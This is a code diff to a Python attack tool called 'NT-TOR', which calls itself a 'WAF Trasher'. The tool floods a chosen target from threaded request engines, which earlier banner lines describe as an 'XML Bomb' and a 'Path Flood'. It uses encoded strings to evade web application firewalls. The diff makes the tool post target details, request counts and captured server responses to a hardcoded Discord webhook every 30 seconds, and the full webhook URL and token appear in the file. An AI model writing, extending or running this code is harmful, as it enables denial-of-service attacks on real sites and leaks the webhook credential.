@@ -43,8 +43,6 @@ class NTTOR:
         self.data_received = 0
         self.last_response_data = "INITIALIZING CONNECTION..."
         self.start_time = datetime.now()
-        self.wave_number = 1
-        self.last_discord_update = 0
         self.session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
         self.lock = threading.Lock()
         
@@ -69,16 +67,11 @@ class NTTOR:
             "%53.%54.%53", "\\x53\\x54\\x53", "&#83;&#84;&#83;"
         ]
         
-        # Send startup
-        self.send_discord_update(initial=True)
-        
         print(f"\n{MAGENTA}{STS} NT-TOR{WHITE} - WAF Trasher [STS BASE V1]{RESET}")
-        print(f"{CYAN}Session: {self.session_id}{RESET}")
+        print(f"Session: {self.session_id}")
         print(f"Target: {target}")
         print(f"Duration: {duration}s")
-        print(f"{YELLOW}H0 Engine: 250 reqs/2-7s | XML Bomb{RESET}")
-        print(f"{RED}H2 Engine: 500 reqs/1-2s | Path Flood{RESET}")
-        print("=" * 70)
+        print("=" * 60)
         
     def rand_str(self, n=8):
         return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
@@ -144,9 +137,13 @@ Content-Length: 56
                 data = sock.recv(8192)
                 with self.lock:
                     self.data_received += len(data)
-                    if data and len(data) > 50:
-                        preview = data[:200].decode('utf-8', errors='ignore').replace('\n', ' ').replace('\r', '')
-                        self.last_response_data = f"{preview}... [{len(data)} bytes]"
+                    if data:
+                        # Store full response data
+                        try:
+                            decoded = data.decode('utf-8', errors='ignore')
+                            self.last_response_data = decoded[:500]  # First 500 chars
+                        except:
+                            self.last_response_data = f"[BINARY DATA: {len(data)} bytes]"
             except:
                 pass
             
@@ -180,9 +177,12 @@ Content-Length: 56
                 data = sock.recv(8192)
                 with self.lock:
                     self.data_received += len(data)
-                    if data and len(data) > 50:
-                        preview = data[:200].decode('utf-8', errors='ignore').replace('\n', ' ').replace('\r', '')
-                        self.last_response_data = f"{preview}... [{len(data)} bytes]"
+                    if data:
+                        try:
+                            decoded = data.decode('utf-8', errors='ignore')
+                            self.last_response_data = decoded[:500]
+                        except:
+                            self.last_response_data = f"[BINARY DATA: {len(data)} bytes]"
             except:
                 pass
             
@@ -194,82 +194,65 @@ Content-Length: 56
         except:
             pass
     
-    def send_discord_update(self, initial=False):
-        """Send scary Discord update (20min waves)"""
+    def send_discord_update(self):
+        """Send scary Discord update (no emojis, pure text)"""
         runtime = str(datetime.now() - self.start_time).split('.')[0]
         total_reqs = self.h0_requests + self.h2_requests
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        if initial:
-            embed = {
-                "title": f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
-                "color": 0x4a0e4a,  # Dark purple
-                "fields": [
-                    {
-                        "name": "S.T.S NT-TOR",
-                        "value": f"```Session: {self.session_id}\nTarget: {self.target}\nWave: #{self.wave_number}```",
-                        "inline": False
-                    },
-                    {
-                        "name": "INITIALIZING",
-                        "value": "```CONNECTION ESTABLISHED```",
-                        "inline": False
-                    }
-                ],
-                "footer": {"text": "STS BASE V1 • LOGGING ACTIVE"}
-            }
-        else:
-            embed = {
-                "title": f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
-                "color": 0x4a0e4a,
-                "fields": [
-                    {
-                        "name": "S.T.S NT-TOR",
-                        "value": f"```Session: {self.session_id}```",
-                        "inline": False
-                    },
-                    {
-                        "name": "TARGET",
-                        "value": f"```{self.target}```",
-                        "inline": False
-                    },
-                    {
-                        "name": "T-R-S",
-                        "value": f"```{total_reqs}```",
-                        "inline": True
-                    },
-                    {
-                        "name": "T-D-R",
-                        "value": f"```{self.format_size(self.data_received)}```",
-                        "inline": True
-                    },
-                    {
-                        "name": "T-D-S",
-                        "value": f"```{self.format_size(self.data_sent)}```",
-                        "inline": True
-                    },
-                    {
-                        "name": "RUNTIME",
-                        "value": f"```{runtime}```",
-                        "inline": False
-                    },
-                    {
-                        "name": "LAST RESPONSE",
-                        "value": f"```{self.last_response_data[:200]}```",
-                        "inline": False
-                    },
-                    {
-                        "name": f"WAVE #{self.wave_number}",
-                        "value": "```PROPAGATING```",
-                        "inline": False
-                    }
-                ],
-                "footer": {"text": f"STS BASE V1 • WAVE {self.wave_number} • 20min CYCLE"}
-            }
+        embed = {
+            "title": f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
+            "color": 0x4a0e4a,  # Dark purple
+            "fields": [
+                {
+                    "name": "S.T.S NT-TOR",
+                    "value": f"```Session: {self.session_id}```",
+                    "inline": False
+                },
+                {
+                    "name": f"({current_time}) [LIVE UPDATE]",
+                    "value": "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
+                    "inline": False
+                },
+                {
+                    "name": "TARGET",
+                    "value": f"```{self.target}```",
+                    "inline": False
+                },
+                {
+                    "name": "T-R-S",
+                    "value": f"```{total_reqs}```",
+                    "inline": True
+                },
+                {
+                    "name": "T-D-R",
+                    "value": f"```{self.format_size(self.data_received)}```",
+                    "inline": True
+                },
+                {
+                    "name": "T-D-S",
+                    "value": f"```{self.format_size(self.data_sent)}```",
+                    "inline": True
+                },
+                {
+                    "name": "RUNTIME",
+                    "value": f"```{runtime}```",
+                    "inline": False
+                },
+                {
+                    "name": "LAST RESPONSE",
+                    "value": f"```{self.last_response_data[:500]}```",
+                    "inline": False
+                }
+            ],
+            "footer": {"text": "STS BASE V1 • NT-TOR"}
+        }
         
         try:
             requests.post(self.webhook_url, json={"embeds": [embed]})
-        except:
-            pass
+            print(f"{MAGENTA}[DISCORD] Update sent{RESET}")
+        except Exception as e:
+            print(f"{RED}[DISCORD] Failed: {e}{RESET}")
     
     def h0_engine(self):
         while self.running:
@@ -290,9 +273,10 @@ Content-Length: 56
                 time.sleep(random.uniform(1, 2))
     
     def monitor(self):
-        """Terminal logging - STS Style"""
+        """Terminal logging - STS BASE V1"""
         last_h0 = 0
         last_h2 = 0
+        last_discord = 0
         
         while self.running:
             time.sleep(1)
@@ -304,19 +288,19 @@ Content-Length: 56
             last_h2 = self.h2_requests
             total = self.h0_requests + self.h2_requests
             
-            # STS Terminal Format
-            print(f"\r{MAGENTA}[S.T.S]{RESET} [{elapsed}s] "
-                  f"{RED}H0:{self.h0_requests}({h0_rps}/s){RESET} | "
-                  f"{CYAN}H2:{self.h2_requests}({h2_rps}/s){RESET} | "
-                  f"{WHITE}TOT:{total}{RESET} | "
-                  f"{YELLOW}↑{self.format_size(self.data_sent)} ↓{self.format_size(self.data_received)}{RESET}", 
+            # Terminal - STS BASE V1 format
+            print(f"\r{MAGENTA}#NT-TOR{RESET} | "
+                  f"H0:{self.h0_requests} | "
+                  f"H2:{self.h2_requests} | "
+                  f"TOT:{total} | "
+                  f"↑{self.format_size(self.data_sent)} | "
+                  f"↓{self.format_size(self.data_received)}", 
                   end='', flush=True)
             
-            # Discord update every 20 mins (1200 seconds) in waves
-            if elapsed % 1200 < 1 and elapsed > 0:
-                with self.lock:
-                    self.wave_number += 1
-                    self.send_discord_update()
+            # Discord update every 30 seconds (not spam)
+            if elapsed - last_discord >= 30:
+                self.send_discord_update()
+                last_discord = elapsed
             
             if elapsed >= self.duration:
                 self.running = False
@@ -329,7 +313,8 @@ Content-Length: 56
         threading.Thread(target=self.monitor, daemon=True).start()
         
         try:
-            time.sleep(self.duration + 1)
+            while self.running:
+                time.sleep(1)
         except KeyboardInterrupt:
             self.running = False
         
@@ -338,17 +323,15 @@ Content-Length: 56
         total = self.h0_requests + self.h2_requests
         
         print(f"\n\n{MAGENTA}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{RESET}")
-        print(f"{MAGENTA}S.T.S NT-TOR - SESSION TERMINATED{RESET}")
+        print(f"S.T.S NT-TOR - SESSION TERMINATED")
         print(f"Session: {self.session_id}")
         print(f"Target: {self.target}")
-        print(f"H0 Requests: {self.h0_requests}")
-        print(f"H2 Requests: {self.h2_requests}")
-        print(f"Total: {total}")
+        print(f"Total Requests: {total}")
         print(f"Data Sent: {self.format_size(self.data_sent)}")
         print(f"Data Received: {self.format_size(self.data_received)}")
         print(f"Duration: {elapsed}s")
         
-        # Send final wave
+        # Final Discord update
         self.send_discord_update()
 
 if __name__ == "__main__":
@@ -356,6 +339,7 @@ if __name__ == "__main__":
     
     if len(sys.argv) < 2:
         print("Usage: python nt-tor.py <target> [duration]")
+        print("Example: python nt-tor.py example.com 300")
         sys.exit(1)
     
     webhook = "https://discord.com/api/webhooks/1478989089045876779/fDm39Cls5AfZ0gZJM0sbhtJt59jo3i1Oy2_aHO3GmmSUw3gdg4pDfH7niEiXiA18ZJsM"
